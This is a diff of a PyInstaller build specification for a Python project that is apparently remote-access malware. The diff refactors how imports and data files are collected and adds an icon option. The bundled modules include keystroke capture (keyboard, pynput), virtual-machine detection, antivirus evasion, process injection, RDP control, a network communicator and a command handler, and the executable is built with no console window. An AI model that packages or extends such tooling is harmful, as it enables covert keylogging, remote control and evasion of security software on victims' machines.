@@ -1,13 +1,13 @@
 # -*- mode: python ; coding: utf-8 -*-
 
+from PyInstaller.utils.hooks import collect_all, collect_data_files
+import os
+
 block_cipher = None
 
-a = Analysis(
-    ['main.py'],
-    pathex=[],
-    binaries=[],
-    datas=[],
-    hiddenimports=[
+# Collect data files for important modules
+def get_hidden_imports_and_data():
+    hidden_imports = [
         'keyboard',
         'pynput',
         'pynput.keyboard',
@@ -56,22 +56,41 @@ a = Analysis(
         'json',
         'base64',
         'hashlib',
-        'system',
         'system.file_manager',
         'system.collector',
         'system.vm_detector',
         'system.anti_av',
         'system.process_injector',
-        'monitoring',
         'monitoring.logger',
         'monitoring.rdp_controller',
-        'network',
         'network.communicator',
-        'encryption',
         'encryption.manager',
-        'commands',
         'commands.handler',
-    ],
+    ]
+    
+    datas = []
+    binaries = []
+    
+    # Collect data for important packages
+    for package in ['cryptography', 'PIL', 'pynput', 'certifi', 'pywin32']:
+        try:
+            pkg_datas, pkg_binaries, pkg_hidden = collect_all(package)
+            datas.extend(pkg_datas)
+            binaries.extend(pkg_binaries)
+            hidden_imports.extend(pkg_hidden)
+        except Exception as e:
+            print(f"Warning: Could not collect data for {package}: {e}")
+    
+    return hidden_imports, datas, binaries
+
+hidden_imports, additional_datas, additional_binaries = get_hidden_imports_and_data()
+
+a = Analysis(
+    ['main.py'],
+    pathex=[],
+    binaries=additional_binaries,
+    datas=additional_datas,
+    hiddenimports=hidden_imports,
     hookspath=[],
     hooksconfig={},
     runtime_hooks=[],
@@ -81,14 +100,6 @@ a = Analysis(
     cipher=block_cipher,
     noarchive=False,
 )
-
-# Collect all from important packages
-a.datas += collect_all('cryptography')[0]
-a.binaries += collect_all('cryptography')[1]
-a.datas += collect_all('PIL')[0]
-a.binaries += collect_all('PIL')[1]
-a.datas += collect_all('pynput')[0]
-a.datas += collect_all('certifi')[0]
 
 pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
 
@@ -103,13 +114,14 @@ exe = EXE(
     debug=False,
     bootloader_ignore_signals=False,
     strip=False,
-    upx=False,  # Disable UPX compression
+    upx=False,
     upx_exclude=[],
     runtime_tmpdir=None,
-    console=False,  # No console window
+    console=False,
     disable_windowed_traceback=False,
     argv_emulation=False,
     target_arch=None,
     codesign_identity=None,
     entitlements_file=None,
+    icon='icon.ico' if os.path.exists('icon.ico') else None,
 )
